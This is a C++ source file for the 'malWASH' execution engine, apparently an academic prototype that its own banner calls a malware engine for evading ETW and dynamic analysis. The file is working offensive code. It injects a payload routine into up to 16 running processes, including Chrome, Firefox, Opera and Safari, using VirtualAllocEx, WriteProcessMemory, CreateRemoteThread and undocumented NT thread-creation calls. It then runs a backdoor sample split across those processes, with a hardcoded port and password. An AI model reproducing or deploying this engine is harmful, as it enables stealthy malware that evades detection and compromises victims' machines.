//-----------------------------------------------------------------------------------------------------------
/*
**	                             ,,                                                        
**	                           `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**	                             MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**	`7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**	  MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**	  MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**	  MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**	.JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**	    
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The execution engine ** - Version 2.0
**
**
**	malwash_exec.cpp (main)
**
**	This is the main program. It is responsible for calling functions from loader module and load the 
**	important parts of the original malware to memory.
**
**
**	Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015 
*/
//-----------------------------------------------------------------------------------------------------------
#include "stdafx.h"
#include "malwash.h"
 
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <windowsx.h>
#include <tlhelp32.h>
#include <process.h> 

#pragma comment (lib, "Ws2_32.lib")						// Need to link with Ws2_32.lib
//-----------------------------------------------------------------------------------------------------------
#define __ABORT_ON_INJECT_FAILURE__						// abort execution on failure instead of returning false

#define NBLOCKS 195										// number of program blocks
#define NSEGMS	2										// number of program segments
#define NPROC	16										// number of processes to inject malWASH
 

HANDLE		threadid[ MAXCONCURNPROC ];					// store all thread IDs here
int			sockstartup;								// are sockets used?
shctrl_t	*shctrl;									// pointer to our shared control

// The processes that we're going to inject malWASH is important. There are many reason for executer()
// to crash in the foreign process (e.g. failure to attach in the predefined base addresses). So we can
// have a whitelist or a blacklist of processes to inject malWASH.
// We define both here
const wchar_t* whitelist[] = {							// whitelist
	L"victim_0.exe", L"victim_1.exe", L"victim_2.exe", L"victim_3.exe", 
	L"victim_4.exe", L"victim_5.exe", L"victim_6.exe", L"victim_7.exe", 
	L"victim_8.exe", L"victim_9.exe", L"victim_a.exe", L"victim_b.exe", 
	L"victim_c.exe", L"victim_d.exe", L"victim_e.exe", L"victim_f.exe",
	L"chrome.exe",   L"firefox.exe",  L"opera.exe",    L"Safari.exe", 0
};

const wchar_t* blacklist[] = {							// blacklist
	L"explorer.exe", 0
};

enum listmode {ALLOW=0, EXCLUDE};						// type of list whitelist/blacklist
// ----------------------------------------------------------------------------------------------------------
// native API definitions
// ----------------------------------------------------------------------------------------------------------

#ifdef __VAR_5_USE_NTAPI_FOR_INJECTION__

typedef struct _UNICODE_STRING {
	USHORT					Length;
	USHORT					MaximumLength;
	PWSTR					Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG					Length;
	HANDLE					RootDirectory;
	PUNICODE_STRING			ObjectName;
	ULONG					Attributes;
	PVOID					SecurityDescriptor;
	PVOID					SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID					UniqueProcess;
	PVOID					UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(__stdcall *_ZwOpenProcess)(
	PHANDLE					ProcessHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes,
	PCLIENT_ID				ClientId
);

typedef NTSTATUS(__stdcall *_ZwAllocateVirtualMemory)(
	HANDLE					ProcessHandle,
	PVOID					*BaseAddress,
	ULONG_PTR				ZeroBits,
	PSIZE_T					RegionSize,
	ULONG					AllocationType,
	ULONG					Protect
);

typedef NTSTATUS(__stdcall *_ZwWriteVirtualMemory)(
	HANDLE					ProcessHandle,
	PVOID					BaseAddress,
	PVOID					Buffer,
	ULONG					NumberOfBytesToWrite,
	PULONG					NumberOfBytesWritten OPTIONAL 
);

typedef struct _INITIAL_TEB {
	PVOID					StackBase;
	PVOID					StackLimit;
	PVOID					StackCommit;
	PVOID					StackCommitMax;
	PVOID					StackReserved;
} INITIAL_TEB, *PINITIAL_TEB;


typedef NTSTATUS (__stdcall *_NtCreateThreadEx) (
	PHANDLE					hThread,
	ACCESS_MASK				DesiredAccess,
	LPVOID					ObjectAttributes,
	HANDLE					ProcessHandle,
	LPTHREAD_START_ROUTINE	lpStartAddress,
	LPVOID					lpParameter,
	BOOL					CreateSuspended,
	ULONG					StackZeroBits,
	ULONG					SizeOfStackCommit,
	ULONG					SizeOfStackReserve,
	LPVOID					lpBytesBuffer
);

typedef NTSTATUS(__stdcall *_RtlCreateUserThread)(
	HANDLE					ProcessHandle,
	PSECURITY_DESCRIPTOR	SecurityDescriptor OPTIONAL,
	BOOLEAN					CreateSuspended,
	ULONG					StackZeroBits,
	OUT PULONG				StackReserved,
	OUT PULONG				StackCommit,
	PVOID					StartAddress,
	PVOID					StartParameter OPTIONAL,
	PHANDLE					ThreadHandle,
	PCLIENT_ID				ClientID 
);

struct NtCreateThreadExBuffer {
	ULONG					Size;
	ULONG					Unknown1;
	ULONG					Unknown2;
	PULONG					Unknown3;
	ULONG					Unknown4;
	ULONG					Unknown5;
	ULONG					Unknown6;
	PULONG					Unknown7;
	ULONG					Unknown8;
 }; 

#define OBJ_CASE_INSENSITIVE   0x00000040
#define InitializeObjectAttributes( i, o, a, r, s ) { \
		(i)->Length = sizeof( OBJECT_ATTRIBUTES );    \
		(i)->RootDirectory = r;                       \
		(i)->Attributes = a;                          \
		(i)->ObjectName = o;                          \
		(i)->SecurityDescriptor = s;                  \
		(i)->SecurityQualityOfService = NULL;         \
	}

#ifndef STATUS_SUCCESS
	#define STATUS_SUCCESS 0x00000000
#endif

_ZwOpenProcess				ZwOpenProcess;
_ZwAllocateVirtualMemory	ZwAllocateVirtualMemory;
_ZwWriteVirtualMemory		ZwWriteVirtualMemory;
_NtCreateThreadEx			NtCreateThreadEx;
_RtlCreateUserThread		RtlCreateUserThread;
#endif

//-----------------------------------------------------------------------------------------------------------
/*
**  fatal(): This function is called when fatal error are occured. fatal() prints the error description and
**		terminates the program.
**
**	Arguments: format (char*) : A format string, containing the error description
**
**  Return Value: None.
*/
void fatal( const char* format, ... )
{
    va_list args;                                           // our arguments

    fprintf( stderr, " [ERROR]: " );                        // print error identifier

    va_start( args, format );                               // start using variable argument list
    vfprintf( stderr, format, args );                       // print error message
    va_end( args );                                         // stop using variable argument list

    fprintf( stderr, ". Quiting!\n" );                      // print trailer

	system("pause");										// hold on to read the message

    exit( EXIT_FAILURE );                                   // terminate with failure
}

//-----------------------------------------------------------------------------------------------------------
/*
**	inject(): Inject the whole executer() into an open, with the appropriate permissions to create a remote
**		thread, process. If injection is successfull function also closes the open handle to that process.
**		executer() needs process IDs of all other instances, to perform certain operations in duptab and in
**		mailbox. Thus we create all threads in suspended state, we set up tables, and then we launch all 
**		threads together.
**	
**	Arguments: hproc (HANDLE) : An open handle to a process.
**		
**  Return Value: If function is successful, function returns a handle to the suspended remote thread. 
**		Otherwise, the return value is NULL.
*/
HANDLE inject( HANDLE hproc )
{
	LPVOID	funst, funent;									// executer() entry point in current and remote process
	ULONG	funsz;											// executer() size
	LPBYTE	p;												// auxilary pointer
	DWORD   nwritten, threadid;								// written bytes and thread ID
	HANDLE	hrthreadhdl;									// remote thread handle


	//
	// executer() must allocate some memory regions in predefined addresses (for stack, heap and segments). 
	// We have to make sure that these allocations won't fail. So, we try to do some dummy allocation to
	// see if they fail. If not, we deallocate the memory. If the allocation doesn't fail, we know that 
	// the allocationsin executer won't fail.
	//
/*	
	LPVOID vp, vp2;											// void auxilary pointers 

	// try to allocate memory for stack and heap (4M for heap seem enough)
	vp  = VirtualAllocEx(hproc, a, STACKSIZE, MEM_COMMIT, PAGE_READWRITE);
	vp2 = VirtualAllocEx(hproc, (void*)HEAPBASEADDR,  0x400000,  MEM_COMMIT, PAGE_READWRITE);
	if( !vp || !vp2 ||										// allocation or free failed?
		!VirtualFreeEx(hproc, vp, STACKSIZE, MEM_DECOMMIT) ||
		!VirtualFreeEx(hproc, vp2, 0x400000, MEM_DECOMMIT) )
			return NULL;									// if so, return NULL


	for( uint i=0; i<shctrl->nsegms; i++ )					// for each segment
	{
		// try to allocate memory for segment
		vp = VirtualAllocEx(hproc, (LPVOID)(SEGMBASEADDR + i*SEGMNXTOFF), SEGMNXTOFF, 
							MEM_COMMIT, PAGE_READWRITE);

		if( !vp ||													// allocation failed?
			!VirtualFreeEx(hproc, vp, SEGMNXTOFF, MEM_DECOMMIT) )	// free failed?
				return NULL;										// if so, return NULL
	}
*/

	// Now, we identify the base address of executer() and its size:
	//
	// when we ask the address of executer, we actually get its address in Import Local Table (ILT):
	// executer:
	//		00311203 E9 08 03 00 00       jmp         executer (311510h)
	//
	// from there we can get the offset from the current location, and find the real address:
	//		[1]. (ULONG)executer + 1, to skip the 0xe9 opcode and go to the address of the offset
	//		[2]. *(LPDWORD)((ULONG)executer + 1), to read the offset
	//		[3]. (ULONG)executer + *(LPDWORD)((ULONG)executer + 1) + 5 will gives us the real entry point
	//			 (+5=jmp length, because jump offset starts from the instruction below)
	//
	//	after finding the entry point, we have to find the end point. 9 bytes before function end we have
	//	added a unique signature: "malWASH_ends$$$". We start from the beginning and we search downwards 
	// for this signature. Once we find this signature, we know that 9 bytes (for function epilog) below 
	// is the function end.
	funst = (LPBYTE)((ULONG)executer + *(LPDWORD)((ULONG)executer + 1) + 5);
	        
	for( p=(LPBYTE)funst; strcmp((char*)p, "malWASH_ends$$$"); p++ )
		;

	funsz = (ULONG)p + 16 + 9 - (ULONG)funst;				// get function size

	// allocate memory to remote process
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
	if( (funent = VirtualAllocEx(hproc, NULL, funsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL )
#else
	funent = NULL;											// clear base address

	if( ZwAllocateVirtualMemory(hproc, &funent, 0, &funsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE ) 
		!= STATUS_SUCCESS ) 
#endif
	#ifdef __ABORT_ON_INJECT_FAILURE__						// abort upon failures?
			fatal("Cannot allocate memory to remote process: %d", GetLastError() );
	#else
			return false;									// just return false
	#endif
   
	// copy executer to remote process address space
	// do not have breakpointss in executer() during copy -> they'll replace opcodes with 0xcc (int3)
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
    if( !WriteProcessMemory(hproc, funent, funst, funsz, &nwritten) )
#else
	if( ZwWriteVirtualMemory(hproc, funent, funst, funsz, &nwritten) != STATUS_SUCCESS )
#endif
	#ifdef __ABORT_ON_INJECT_FAILURE__						// abort upon failures?		
			fatal("Cannot write to remote process");
	#else
			return false;									// just return false
	#endif
	
	// create the remote thread in suspended state
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__
	if( !(hrthreadhdl = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)funent, 
							NULL, CREATE_SUSPENDED, &threadid)))
#else
// WARNING: Both RtlCreateUserThread and NtCreateThreadEx fail under win64
//
// You can also try this
//	if( RtlCreateUserThread(hproc, NULL, TRUE, 0, NULL, NULL, funent, NULL, &hrthreadhdl, NULL) 
//		!= STATUS_SUCCESS ) 

	ULONG a = 0, b = 0;
	NtCreateThreadExBuffer Buffer;
	memset(&Buffer, 0, sizeof(NtCreateThreadExBuffer));
 
	Buffer.Size     = sizeof(NtCreateThreadExBuffer);
	Buffer.Unknown1 = 0x10003;
	Buffer.Unknown2 = 0x8;
	Buffer.Unknown3 = &a;
	Buffer.Unknown4 = 0;
	Buffer.Unknown5 = 0x10004;
	Buffer.Unknown6 = 4;
	Buffer.Unknown7 = &b;
	Buffer.Unknown8 = 0;
 
	if( NtCreateThreadEx( &hrthreadhdl, 0x1FFFFF, NULL, hproc, (LPTHREAD_START_ROUTINE)funent,
							NULL, FALSE, NULL, NULL, NULL, &Buffer) != STATUS_SUCCESS )
#endif
	#ifdef __ABORT_ON_INJECT_FAILURE__						// abort upon failures?		
			fatal("Cannot create remote thread");
	#else
			return false;									// just return false
	#endif

	// close process handle (don't do error check)
	CloseHandle( hproc );	

	return hrthreadhdl;										// success!
}

//-----------------------------------------------------------------------------------------------------------
/*
**	findprocs(): Inject code in some processes. This function can take a whitelist of process names and try
**		to inject only on these processes, or a blacklist and inject the code in any process except these
**		in list. In the latter case, we specify the number of processes that we want to inject executer().
**
**	Arguments: N       (ushort)   : The number of processes to inject
**            proclist (wchar_t*) : A list of process names
**            lm       (listmode) : Type of list (whitelist - blacklist)
**
**  Return Value: If function is successful, function retunrs the open handle
*/
void findNprocs( ushort N, const wchar_t *proclist[], listmode lm )
{
	HANDLE			snapshot, hproc;						// snapshot and current process handles
    PROCESSENTRY32	proc32;									// process entry
	ushort			ninj = 4;								// number of injected processes so far
	int				skip;									// internal flag


	// try to take a snapshot of all active processes
	if((snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		fatal("Cannot take  a snapshot of running processes");
	
	proc32.dwSize = sizeof(PROCESSENTRY32);					// set up process size

	while( Process32Next(snapshot,&proc32) == TRUE )		// as long as there are processes in the list
	{
		skip = !lm;											// =1 if ALLOW, =0 if EXCLUDE
		
		for( uint i=0; proclist[i]!=NULL; i++ )				// for each process name in process list
			if( !wcscmp(proc32.szExeFile, proclist[i] ) )	// check if name matcehs
			{
				skip = lm;									// =0 if ALLOW, =1 if EXCLUDE
				break;										// stop searching
			}

		if( skip ) continue;								// is skip set? if so get next process

		// try to open process
#ifndef __VAR_5_USE_NTAPI_FOR_INJECTION__	
		if((hproc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
									FALSE, proc32.th32ProcessID )) != NULL)
#else 
	OBJECT_ATTRIBUTES objAttribs = { 0 };
	CLIENT_ID cid = { (HANDLE) proc32.th32ProcessID, 0 };

	InitializeObjectAttributes(&objAttribs, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if( ZwOpenProcess(&hproc, PROCESS_CREATE_THREAD| PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
			&objAttribs, &cid) == STATUS_SUCCESS )
#endif	
		{
			shctrl->pidtab[ninj] =  proc32.th32ProcessID;	// store process id (if inject fails, next 
															// attempt will overwrite it)
			if( (threadid[ninj] = inject(hproc)) &&			// increase only if inject() was successfull
				++ninj >= N ) break;						// inject to N processes?
		}
	}
}


//-----------------------------------------------------------------------------------------------------------
/*
**	setargs(): Set command line arguments. Note that we use this as a function to make pack() function 
**		easier.
**
**	Arguments: s (shctrl_t*) : A pointer to shared control region
**
**  Return Value: None.
*/
void setargs( shctrl_t *s )
{
	// basic backdoor 3
		*(uint*)(shctrl->ctx[0].esp + 4) = 3;				// hInstance or argc
		*(uint*)(shctrl->ctx[0].esp + 8) = STACKBASEADDR	// hPrevInstance or argv
											+ 0x100;
		*(uint*)(STACKBASEADDR + 0x100) = STACKBASEADDR + 0x200;
		*(uint*)(STACKBASEADDR + 0x104) = STACKBASEADDR + 0x210;
		*(uint*)(STACKBASEADDR + 0x108) = STACKBASEADDR + 0x220;
		*(uint*)(STACKBASEADDR + 0x10c) = 0;

		strcpy( (char*)(STACKBASEADDR + 0x200), "backdoor.exe");
		strcpy( (char*)(STACKBASEADDR + 0x210), "1337");
		strcpy( (char*)(STACKBASEADDR + 0x220), "xrysa");
			
		
	// Cpp Backdoor arguments	
	/*
		*(uint*)(shctrl->ctx[0].esp + 0x4) = 0;			// hInstance or argc	
		*(uint*)(shctrl->ctx[0].esp + 0x8) = 0;			// hPrevInstance or argv
		*(uint*)(shctrl->ctx[0].esp + 0xc) = STACKBASEADDR + ARGVBASEOFF;			

		strcpy( (char*)(STACKBASEADDR + ARGVBASEOFF), "-k UserService");
	*/
}

//-----------------------------------------------------------------------------------------------------------
/*
**	That's the main function...
*/
//-----------------------------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
	printf("++==============================================================++\n");
    printf("||                       _   __      __                _        ||\n");
    printf("||     _ __    __ _     | |  \\ \\    / /__ _     ___   | |_      ||\n");
    printf("||    | '  \\  / _` |    | |   \\ \\/\\/ // _` |   (_-<   | ' \\     ||\n");
    printf("||    |_|_|_| \\__,_|   _|_|_   \\_/\\_/ \\__,_|   /__/_  |_||_|    ||\n");
    printf("||   _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|   ||\n");
    printf("||   \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'   ||\n");
 	printf("++==============================================================++\n");
	printf("||                           malWASH                            ||\n");
	printf("||   The malware engine for evading ETW and dynamic analysis    ||\n");
	printf("||                                                              ||\n");
	printf("||                    Block Execution Engine                    ||\n");
	printf("++==============================================================++\n");

	reasm();

#ifdef __VAR_5_USE_NTAPI_FOR_INJECTION__

	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");			// get ntdll.dll module

	// locate undocumented functions (with no error check)
	ZwOpenProcess           = (_ZwOpenProcess)          GetProcAddress(ntdll, "ZwOpenProcess");
	ZwAllocateVirtualMemory = (_ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	ZwWriteVirtualMemory    = (_ZwWriteVirtualMemory)   GetProcAddress(ntdll, "ZwWriteVirtualMemory");
	NtCreateThreadEx        = (_NtCreateThreadEx)       GetProcAddress(ntdll, "NtCreateThreadEx");
	RtlCreateUserThread     = (_RtlCreateUserThread)    GetProcAddress(ntdll, "RtlCreateUserThread");

#endif

	// create or attach to shared control region
	shctrl = (shctrl_t*) crtshreg("ControlRegion", sizeof(shctrl_t), NULL );
	
	if( strcmp(shctrl->signature, "malWASH") )				// valid signature ?
	{
		// signature isn't valid. So this process is the first one tha uses the shared region. Initialize it.
		strcpy_s(shctrl->signature, 8, "malWASH");
		 
		shctrl->nblks       = NBLOCKS;						// set number of blocks
		shctrl->nxtblk[0]   = 1;							// always start with block 1
		shctrl->nsegms      = NSEGMS;						// set number of segments
		shctrl->nproc       = NPROC;						// set number of processses
		shctrl->nxtheapaddr = HEAPBASEADDR;					// that's  the base address of shared heap

		for( int i=0; i<NMAXTHREADS; i++ )					// for each possible thread
		{	
			// set at the middle of current stack
			shctrl->ctx[i].esp = STACKBASEADDR + (STACKSIZE + 0x20000)*i + 0x10000;
			shctrl->ctx[i].ebp = shctrl->ctx[i].esp - 0x80;	// OPTIONAL
			shctrl->ctx[i].eax = 0xdeadbeef;				// that's totally useless

			shctrl->thrdst[i] = THREAD_UNUSED;				// all threads are disabled
		}

		shctrl->thrdst[0] = THREAD_RUNNING;					// main thread is active

		/*
		** Set up Default command line arguments:
		**
		**	int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
		**	int main   (int argc, char *argv);
		*/

		loadsegms();										// load segments to shared memory
		loadmodtab();										// load module table to shared memory
		loadfuntab();										// load function table to shared memory
		loadthdtab();										// load thread table to shared memory
		loadinitab();										// load initialized pointer table to shared memory
		loadblks();											// load all blocks to shared memeory
		
		printf( "[+] All blocks loaded successfully\n" );
	
		// if you want to set argc and argv main arguments (or WinMain() arguments), here's the right
		// place to do it:
		//	[1]. Create the shared stack
		//	[2]. Start Placing the arguments starting from shctrl->ctx.esp + 4:
		//	[3]. Set a possible exit point as return address
		crtshreg("SharedStack1", STACKSIZE, (void*)STACKBASEADDR );
		*(uint*)(shctrl->ctx[0].esp) = (uint)(ExitThread);	// return address to ExitThread

		setargs( shctrl );								// setup command line arguments
	}
	
	// search in function table for calls to WSAStartup(). If you find it, every process must call
	// it. It doesn't matter when you'll call this function. Instead of sending a mail to other processes
	// at the time that the first process calls WSAStartup(), we send the mail now, to make things easier.
	// Note that we ignore calls to WSACleanup().
	for( uint i=0; i<FUNTBLSIZE; i++ )						// scan funtab non-efficiently (it contains NULLs)
		if( !strcmp(&shctrl->funtab[i], "WSAStartup") )		// function found?
		{		
			for( uint i=0; i<shctrl->nproc; i++ )			// for each process
				shctrl->mailbox[i][0].cmd = CMD_WSASTARTUP; // send the proper mail to each process
		}

	
	// find some processes to inject executer()
	printf( "[+] Searching for at most %d process(es) to inject executer()... ", NPROC );
	
	findNprocs( NPROC, whitelist, ALLOW);					// whitelist approach
	// findNprocs( NPROC, blacklist, EXCLUDE );				// blacklist approach

	printf( "Done.\n" );
	printf( "[+] Launching executer() of all processes...\n" );

	// resume all threads (ResumeThread(NULL) won't cause problems)
	for( uint i=0; i<shctrl->nproc; i++ )					// for each process
		printf( "Starting Emulator at process %d. Return Value: %d\n", 
				shctrl->pidtab[i],	
				ResumeThread( threadid[i] ) );				// start remote thread execution
															// (no problem if it's NULL)
		

//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifndef __0__
	// this is for debugging only (local executer() in current process) 
	DWORD   dwThreadIdArray;
    DWORD	retval, old;
	HANDLE	hThreadArray;
	

	shctrl->pidtab[9] = GetCurrentProcessId();
	//shctrl->pidtab[3] = 0xcafe; 
	//shctrl->pidtab[4] = 0xbeef;
	
	bool res = VirtualProtect((LPVOID)((ULONG)executer), 32768, PAGE_EXECUTE_READWRITE, &old );

#ifdef __VAR_9_TRACE_BLOCKS__
	FILE *fp = fopen( "blks.log", "a+" );
	fprintf( fp, "* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n" );
	fclose( fp );
#endif

	// Create the thread to begin execution on its own.
	hThreadArray = CreateThread( 
		NULL,                   // default security attributes
		0,                      // use default stack size  
		executer,				// thread function name
		NULL,					// argument to thread function 
		0,                      // use default creation flags 
		&dwThreadIdArray);		// retu


	// write executer bytes into a file 
	FILE *fp = fopen("executer_raw.txt", "w");
	
	LPBYTE p, funst = (LPBYTE)((ULONG)executer + *(LPDWORD)((ULONG)executer + 1) + 5);
	      
	for( p=(LPBYTE)funst; strcmp((char*)p, "malWASH_ends$$$"); p++ )
		fprintf(fp, "\\x%02x", (*p) & 0xff);
	
	fclose( fp );
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

	printf( "Done.\n" );
	
	// this delay is needed to make sure that the first emulator will start
	// before loader close, because we need >0 processes to be attached in shared regions
	Sleep( 1000 );	


	// some samples might hide their window. Make it visible again:
	ShowWindow(FindWindowA(NULL, "Norton AntiVirus"), SW_SHOW );
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_SHOW );
	ShowWindow(FindWindowA(NULL, "Remote Keylogger"), SW_SHOW );
	
	system( "pause" );

	return 0;												// return success!
}
//-----------------------------------------------------------------------------------------------------------
